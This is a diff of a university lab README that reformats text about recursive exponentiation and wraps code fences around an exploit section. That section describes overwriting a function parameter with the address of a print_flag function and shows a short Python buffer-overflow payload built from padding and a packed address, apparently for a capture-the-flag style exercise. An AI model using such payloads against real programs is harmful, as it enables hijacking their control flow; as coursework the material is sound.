@@ -12,7 +12,8 @@ Copyright 2022 Maria Sfiraiala (maria.sfiraiala@stud.acs.upb.ro)
 ### b)
 - We check whether the exponent is 0, if so, the recursion stops and we return.
 - Otherwise, we check if the exponent is odd or even and based on this
-information we either call f(a, b - 1) and multiply the result by a, or call f (a, b / 2) and multiply the result by itself.
+information we either call f(a, b - 1) and multiply the result by a, or call 
+f(a, b / 2) and multiply the result by itself.
 
 -------------------------------------------------------------------------------
 
@@ -31,7 +32,7 @@ sent the necessary number of bytes, required by every read().
 - The sixth function had its  third parameter overwritten with the address
 of the print_flag function we wanted to call.
 - The exploit:
-
+```
     import sys
     import struct
 
@@ -40,3 +41,4 @@ of the print_flag function we wanted to call.
 
     payload = offset * b'A' + struct.pack("<I", address)
     sys.stdout.buffer.write(payload)
+```
